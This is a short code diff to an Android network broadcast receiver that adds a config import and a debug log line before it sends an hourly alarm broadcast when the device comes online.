@@ -4,6 +4,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.config.Config;
 
 /**
  * Created with IntelliJ IDEA.
@@ -16,6 +17,10 @@ public class NetworkBroadcastReceiver extends BroadcastReceiver {
 
     public void onReceive(Context context, Intent intent) {
         if (intent != null && UtilsRuntime.isOnline(context)) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to send broadcast : " + ScreenBRC.HOUR_ALARM_ACTION + " >>>>>");
+            }
+
             Intent i = new Intent();
             i.setAction(ScreenBRC.HOUR_ALARM_ACTION);
             context.sendBroadcast(i);
